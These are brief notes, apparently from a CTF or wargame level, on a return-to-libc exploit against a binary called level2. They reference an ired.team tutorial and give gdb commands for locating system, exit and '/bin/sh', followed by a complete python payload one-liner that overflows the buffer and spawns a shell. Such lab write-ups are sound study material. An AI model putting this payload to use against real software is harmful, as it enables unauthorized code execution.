https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc

we will need to :
- locate system and exit adresses
- "/bin/sh" string

"/bin/sh" and `system` : in gdb `b main; r; p system`
> $1 = {<text variable, no debug info>} **0xb7e6b060** <system>

find &system, +999999999, "/bin/sh"
> **0xb7f8cc58**

exit : `p exit`
> $1 = {<text variable, no debug info>} **0xb7e5ebe0** <exit>

ret: **0x0804854b**

`(python -c "print('a' * 80 + '\x4b\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./level2`